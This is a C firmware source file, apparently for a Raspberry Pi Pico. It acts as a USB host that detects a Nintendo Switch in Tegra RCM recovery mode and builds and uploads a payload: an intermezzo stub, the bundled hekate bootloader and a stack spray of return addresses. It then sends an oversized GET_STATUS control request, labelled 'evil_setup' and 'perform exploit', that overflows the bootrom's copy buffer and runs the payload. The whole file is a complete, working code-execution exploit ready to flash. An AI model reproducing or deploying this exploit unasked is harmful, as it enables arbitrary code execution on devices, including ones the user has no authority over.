#include <pico/stdlib.h>
#include <pico/platform.h>
#include <tusb.h>
#include <bsp/board.h>
#include "host/usbh_pvt.h"
#include <string.h>

#include "bin/hekate_ctcaer_6.5.2.hex"
#include "bin/intermezzo.hex"

#define LED_PIN 13

#define USB_VID 0x0955
#define USB_PID 0x7321

#define USB_EP_OUT 0x01u
#define USB_EP_IN 0x81u
#define USB_PACKET_SIZE 0x1000u
#define USB_XFER_TIMEOUT_MS 1000u
#define SMASH_XFER_TIMEOUT_MS 1000u
#define RCM_COMMAND_PAYLOAD_OFFSET 680u
#define RCM_PAYLOAD_ADDR 0x40010000
#define PAYLOAD_START_ADDR 0x40010E40
#define STACK_SPRAY_START 0x40014E40
#define STACK_SPRAY_END 0x40017000
#define STACK_END 0x40010000

#define RCM_MAX_LENGTH 0x30298u

uint8_t payload_buffer[RCM_MAX_LENGTH] = {0};

const uint32_t COPY_BUFFER_ADDRESSES[2] = {0x40005000, 0x40009000};

volatile int error_line = 0;

static int current_buffer = 0;

typedef struct {
    volatile bool complete;
    volatile xfer_result_t result;
    volatile uint32_t actual_len;
} sync_xfer_t;

static void _panic(int);
static void assert_true(bool, int);
static void assert_success(xfer_result_t, int);
void tuh_mount_cb(uint8_t);
static inline uint32_t align_up(uint32_t, uint32_t);
static inline uint32_t get_current_buffer_address();
static inline void toggle_buffer();
static void sync_xfer_cb(tuh_xfer_t*);
static bool wait_for_xfer(sync_xfer_t*, uint32_t);
static xfer_result_t endpoint_xfer(uint8_t, uint8_t, uint8_t*, uint32_t, uint32_t*, uint32_t, int);
void trigger_controlled_memcpy(uint8_t);
void endpoint_read(uint8_t, uint8_t*, uint32_t);
void payload_write(uint8_t, uint8_t const*, uint8_t const*);
uint8_t *build_payload(void);

static bool rcm_driver_init(void);
static bool rcm_driver_deinit(void);
static bool rcm_driver_open(uint8_t, uint8_t, tusb_desc_interface_t const*, uint16_t);
static bool rcm_driver_set_config(uint8_t, uint8_t);
static bool rcm_driver_xfer_cb(uint8_t, uint8_t, xfer_result_t, uint32_t);
static void rcm_driver_close(uint8_t);

static usbh_class_driver_t const rcm_driver[] = {
    {
        .name = "RCM",
        .init = rcm_driver_init,
        .deinit = rcm_driver_deinit,
        .open = rcm_driver_open,
        .set_config = rcm_driver_set_config,
        .xfer_cb = rcm_driver_xfer_cb,
        .close = rcm_driver_close,
    },
};

usbh_class_driver_t const *usbh_app_driver_get_cb(uint8_t *driver_count)
{
    *driver_count = 1;
    return rcm_driver;
}

int main()
{
    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN, GPIO_OUT);

    assert_true(tusb_init(), __LINE__);

    while (1)
    {
        tuh_task();
    }
}

static void _panic(int line_nubmer)
{
    error_line = line_nubmer;
    while (1) {
        gpio_put(LED_PIN, 1);
        sleep_ms(300);
        gpio_put(LED_PIN, 0);
        sleep_ms(300);
    }
}
static void assert_true(bool expr, int line)
{
    if (!expr)
        _panic(line);
}
static void assert_success(xfer_result_t res, int line)
{
    assert_true(res == XFER_RESULT_SUCCESS, line);
}

static inline void toggle_buffer()
{
    current_buffer = 1 - current_buffer;
}
static inline uint32_t get_current_buffer_address()
{
    return COPY_BUFFER_ADDRESSES[current_buffer];
}
static inline uint32_t align_up(uint32_t value, uint32_t alignment)
{
    return (value + alignment - 1) & ~(alignment - 1);
}

static void sync_xfer_cb(tuh_xfer_t *xfer)
{
    sync_xfer_t *sync = (sync_xfer_t*) xfer->user_data;
    sync->result = xfer->result;
    sync->actual_len = xfer->actual_len;
    sync->complete = true;
}

static bool wait_for_xfer(sync_xfer_t *sync, uint32_t timeout_ms)
{
    absolute_time_t deadline = make_timeout_time_ms(timeout_ms);

    while (!sync->complete)
    {
        tuh_task();
        if (time_reached(deadline))
        {
            return false;
        }
    }

    return true;
}

static xfer_result_t endpoint_xfer(uint8_t daddr, uint8_t ep_addr, uint8_t *buffer,
                                   uint32_t length, uint32_t *actual_len,
                                   uint32_t timeout_ms, int line)
{
    sync_xfer_t sync = {
        .complete = false,
        .result = XFER_RESULT_INVALID,
        .actual_len = 0,
    };

    tuh_xfer_t xfer = {
        .daddr = daddr,
        .ep_addr = ep_addr,
        .buffer = buffer,
        .buflen = length,
        .complete_cb = sync_xfer_cb,
        .user_data = (uintptr_t) &sync,
    };

    assert_true(tuh_edpt_xfer(&xfer), line);
    assert_true(wait_for_xfer(&sync, timeout_ms), line);

    if (actual_len)
    {
        *actual_len = sync.actual_len;
    }

    return sync.result;
}

static bool rcm_driver_init(void)
{
    return true;
}

static bool rcm_driver_deinit(void)
{
    return true;
}

static bool rcm_driver_open(uint8_t rhport, uint8_t daddr,
                            tusb_desc_interface_t const *itf_desc, uint16_t max_len)
{
    (void) rhport;

    if (itf_desc->bInterfaceClass != TUSB_CLASS_VENDOR_SPECIFIC)
    {
        return false;
    }

    uint8_t const *desc = (uint8_t const*) itf_desc;
    uint8_t const *end = desc + max_len;
    bool opened_in = false;
    bool opened_out = false;

    desc += itf_desc->bLength;
    while (desc + 2 <= end)
    {
        uint8_t const len = desc[0];
        uint8_t const type = desc[1];
        if (!len || desc + len > end)
        {
            break;
        }

        if (type == TUSB_DESC_ENDPOINT && len >= sizeof(tusb_desc_endpoint_t))
        {
            tusb_desc_endpoint_t const *ep = (tusb_desc_endpoint_t const*) desc;
            if (ep->bmAttributes.xfer == TUSB_XFER_BULK)
            {
                if (ep->bEndpointAddress == USB_EP_IN)
                {
                    opened_in = tuh_edpt_open(daddr, ep);
                }
                else if (ep->bEndpointAddress == USB_EP_OUT)
                {
                    opened_out = tuh_edpt_open(daddr, ep);
                }
            }
        }

        desc += len;
    }

    return opened_in && opened_out;
}

static bool rcm_driver_set_config(uint8_t daddr, uint8_t itf_num)
{
    usbh_driver_set_config_complete(daddr, itf_num);
    return true;
}

static bool rcm_driver_xfer_cb(uint8_t daddr, uint8_t ep_addr,
                               xfer_result_t result, uint32_t xferred_bytes)
{
    (void) daddr;
    (void) ep_addr;
    (void) result;
    (void) xferred_bytes;
    return true;
}

static void rcm_driver_close(uint8_t daddr)
{
    (void) daddr;
}

void trigger_controlled_memcpy(uint8_t daddr)
{
    tusb_control_request_t evil_setup = {
        .bmRequestType_bit = {
            .direction = TUSB_DIR_IN,
            .type = TUSB_REQ_TYPE_STANDARD,
            .recipient = TUSB_REQ_RCPT_ENDPOINT,
        },
        .bRequest = TUSB_REQ_GET_STATUS,
        .wValue = 0,
        .wIndex = 0,
        .wLength = STACK_END - get_current_buffer_address(),
    };

    // perform exploit
    tuh_xfer_t evil = {
        .daddr = daddr,
        .ep_addr = 0,
        .setup = &evil_setup,
        .buffer = payload_buffer,
        .complete_cb = sync_xfer_cb,
        .user_data = 0,
    };
    sync_xfer_t sync = {
        .complete = false,
        .result = XFER_RESULT_INVALID,
        .actual_len = 0,
    };
    evil.user_data = (uintptr_t) &sync;

    // The smash normally makes the target stop responding, so timeout/stall here
    // can be the expected end state rather than a failure.
    if (tuh_control_xfer(&evil))
    {
        (void) wait_for_xfer(&sync, SMASH_XFER_TIMEOUT_MS);
    }
}

void endpoint_read(uint8_t daddr, uint8_t *buffer, uint32_t length)
{
    uint32_t actual_len = 0;
    xfer_result_t result = endpoint_xfer(daddr, USB_EP_IN, buffer, length,
                                         &actual_len, USB_XFER_TIMEOUT_MS, __LINE__);
    assert_success(result, __LINE__);
    assert_true(actual_len == length, __LINE__);
}

void payload_write(uint8_t daddr, uint8_t const *startp, uint8_t const *endp)
{
    uint32_t length = endp - startp;

    while (length) {
        uint32_t bytes_to_transmit = length < USB_PACKET_SIZE ? length : USB_PACKET_SIZE;
        length -= bytes_to_transmit;

        toggle_buffer();

        uint32_t actual_len = 0;
        xfer_result_t result = endpoint_xfer(daddr, USB_EP_OUT, (uint8_t*) startp,
                                             bytes_to_transmit, &actual_len,
                                             USB_XFER_TIMEOUT_MS, __LINE__);
        assert_success(result, __LINE__);
        assert_true(actual_len == bytes_to_transmit, __LINE__);
        startp += bytes_to_transmit;
    }
}

void switch_to_highbuf(uint8_t daddr) {
    if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1]) {
        static const uint8_t buf[USB_PACKET_SIZE] = { 0 };
        payload_write(daddr, buf, buf + sizeof(buf));
    }
}

uint8_t *build_payload(void)
{
    assert_true((USB_PACKET_SIZE & (USB_PACKET_SIZE - 1)) == 0, __LINE__);
    assert_true((RCM_PAYLOAD_ADDR + sizeof(intermezzo)) <= PAYLOAD_START_ADDR, __LINE__);
    assert_true(STACK_SPRAY_START >= PAYLOAD_START_ADDR, __LINE__);
    assert_true(STACK_SPRAY_END >= STACK_SPRAY_START, __LINE__);
    assert_true(((STACK_SPRAY_END - STACK_SPRAY_START) % 4) == 0, __LINE__);

    uint32_t intermezzo_padding = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + sizeof(intermezzo));
    uint32_t payload_before_spray = STACK_SPRAY_START - PAYLOAD_START_ADDR;
    uint32_t stack_spray_len = STACK_SPRAY_END - STACK_SPRAY_START;
    uint32_t payload_tail_len = sizeof(payload) > payload_before_spray ? sizeof(payload) - payload_before_spray : 0;
    uint32_t payload_size = RCM_COMMAND_PAYLOAD_OFFSET + sizeof(intermezzo) + intermezzo_padding +
                            payload_before_spray + stack_spray_len + payload_tail_len;
    uint32_t padded_size = align_up(payload_size, USB_PACKET_SIZE);

    assert_true(padded_size <= RCM_MAX_LENGTH, __LINE__);

    uint8_t *buf_p = payload_buffer;

    memset(payload_buffer, 0, padded_size);

    *buf_p++ = RCM_MAX_LENGTH & 0xFF;
    *buf_p++ = (RCM_MAX_LENGTH >> 8) & 0xFF;
    *buf_p++ = (RCM_MAX_LENGTH >> 16) & 0xFF;
    *buf_p++ = (RCM_MAX_LENGTH >> 24) & 0xFF;

    buf_p = &payload_buffer[RCM_COMMAND_PAYLOAD_OFFSET];

    memcpy(buf_p, intermezzo, sizeof(intermezzo));
    buf_p += sizeof(intermezzo);

    buf_p += intermezzo_padding;

    uint32_t first_payload_len = sizeof(payload) < payload_before_spray ? sizeof(payload) : payload_before_spray;
    memcpy(buf_p, payload, first_payload_len);
    buf_p += payload_before_spray;

    uint32_t repeat_count = stack_spray_len / 4;
    for (uint32_t i = 0; i < repeat_count; ++i)
    {
        for (uint32_t j = 0; j < 4; ++j)
        {
            *buf_p++ = (RCM_PAYLOAD_ADDR >> (j * 8)) & 0xFF;
        }
    }

    if (sizeof(payload) > payload_before_spray)
    {
        memcpy(buf_p, &payload[payload_before_spray], payload_tail_len);
        buf_p += payload_tail_len;
    }

    assert_true((uint32_t)(buf_p - payload_buffer) == payload_size, __LINE__);

    return payload_buffer + padded_size;
}

void tuh_mount_cb(uint8_t daddr)
{
    // verify that the device is an RCM switch attached
    tusb_desc_device_t desc;
    assert_success(tuh_descriptor_get_device_sync(daddr, &desc, sizeof(tusb_desc_device_t)), __LINE__);
    if (desc.idVendor != USB_VID || desc.idProduct != USB_PID)
    {
        return;
    }

    uint8_t device_id[16];
    endpoint_read(daddr, device_id, sizeof(device_id));

    // Upload the payload
    uint8_t *buf_p = build_payload();
    payload_write(daddr, payload_buffer, buf_p);

    switch_to_highbuf(daddr);

    trigger_controlled_memcpy(daddr);

    gpio_put(LED_PIN, 1);
    while(1);
}
